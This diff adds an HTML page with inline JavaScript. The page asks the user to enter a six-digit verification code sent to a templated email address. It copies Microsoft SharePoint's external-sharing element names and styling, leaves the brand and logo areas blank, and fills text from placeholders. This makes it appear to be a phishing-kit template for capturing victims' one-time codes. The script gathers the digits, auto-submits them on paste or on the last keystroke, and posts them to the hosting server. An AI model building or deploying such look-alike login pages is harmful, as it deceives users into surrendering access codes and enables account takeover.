@@ -1,0 +1,164 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+        content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Verify your email to continue</title>
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+<div id="SharingValidationControlsSection" class="external-sharing-content ms-Fabric">
+  <form method="post" action="?hint=EMAIL_PLACEHOLDER" id="inputForm" onsubmit="handleFormSubmit()">
+    <div class="top-banner">
+      <div class="brand-name"></div>
+    </div>
+    <div class="main-content">
+      <div class="desktop-logo ms-hiddenSm">
+        &nbsp;</div>
+      <div class="sharing-form">
+        <div class="header">
+          <span id="lblFormTitle">Verify Your Identity</span>
+        </div>
+        <div class="form-content">
+          <div id="TOAAEmailEntryControls">
+            <div class="form-message"><span id="lblTOAAEmailDescription">Enter the code that sent to EMAIL_PLACEHOLDER</span>
+            </div>
+            <div class="form-input-container">
+
+              <div class="form-group">
+                <input type="tel" maxlength="1" class="form-control" placeholder="-" required>
+                <input type="tel" maxlength="1" class="form-control" placeholder="-" required>
+                <input type="tel" maxlength="1" class="form-control" placeholder="-" required>
+                <input type="tel" maxlength="1" class="form-control" placeholder="-" required>
+                <input type="tel" maxlength="1" class="form-control" placeholder="-" required>
+                <input type="tel" maxlength="1" class="form-control" placeholder="-" required>
+              </div>
+              <input id="txtTOAACode" type="hidden" name="txtTOAACode">
+            </div>
+            <div class="form-error-container">
+              <span>ERROR_PLACEHOLDER</span>
+            </div>
+            <div class="form-input-container">
+              <input type="submit" name="btnSubmitEmail" value="Verify" id="btnSubmitEmail" accesskey="N"
+                     class="form-submit disable-on-submit">
+              <div class="submitted-text">
+                <div class="spinner"></div>
+                Verifying...
+              </div>
+            </div>
+          </div>
+          <div id="PrivacyPolicy">
+            <div class="privacy">
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="legal">
+        &nbsp;<!--<a href='#'>Terms of Use</a> To Be Deleted-->Privacy &amp; Cookies
+      </div>
+      <div class="mobile-logo ms-hiddenMdUp">
+           </div>
+    </div>
+  </form>
+</div>
+<script>
+    const form = document.querySelector('form')
+    const inputs = form.querySelectorAll('input.form-control')
+    const KEYBOARDS = {
+        backspace: 8,
+        arrowLeft: 37,
+        arrowRight: 39,
+    }
+
+    function handleFormSubmit() {
+        if (event.type === 'submit') {
+            event.preventDefault()
+        }
+        let code = Array.from(inputs).map(input => input.value).join('');
+        if (code.length !== 6) {
+            return
+        }
+        document.querySelector('.form-submit').classList.add('disabled')
+        inputs.forEach(input => input.setAttribute('disabled', 'disabled'))
+        document.querySelector('#txtTOAACode').value = code;
+        form.submit()
+    }
+
+    function handleInput(e) {
+        const input = e.target
+        const nextInput = input.nextElementSibling
+        if (nextInput && input.value) {
+            nextInput.focus()
+            if (nextInput.value) {
+                nextInput.select()
+            }
+        }
+        if (!nextInput) {
+            handleFormSubmit()
+        }
+    }
+
+    function handlePaste(e) {
+        e.preventDefault()
+        const paste = e.clipboardData.getData('text').trim()
+        inputs.forEach((input, i) => {
+            input.value = paste[i] || ''
+        })
+        if (paste.length >= 6) {
+            handleFormSubmit()
+        }
+    }
+
+    function handleBackspace(e) {
+        const input = e.target
+        if (input.value) {
+            input.value = ''
+            return
+        }
+
+        input.previousElementSibling?.focus()
+    }
+
+    function handleArrowLeft(e) {
+        const previousInput = e.target.previousElementSibling
+        if (!previousInput) return
+        previousInput.focus()
+    }
+
+    function handleArrowRight(e) {
+        const nextInput = e.target.nextElementSibling
+        if (!nextInput) return
+        nextInput.focus()
+    }
+
+    form.addEventListener('input', handleInput)
+    form.addEventListener('paste', handlePaste)
+
+    inputs.forEach(input => {
+        input.addEventListener('focus', e => {
+            setTimeout(() => {
+                e.target.select()
+            }, 0)
+        })
+
+        input.addEventListener('keydown', e => {
+            switch(e.keyCode) {
+                case KEYBOARDS.backspace:
+                    handleBackspace(e)
+                    break
+                case KEYBOARDS.arrowLeft:
+                    handleArrowLeft(e)
+                    break
+                case KEYBOARDS.arrowRight:
+                    handleArrowRight(e)
+                    break
+                default:
+            }
+        })
+    })
+
+</script>
+</body>
+</html>
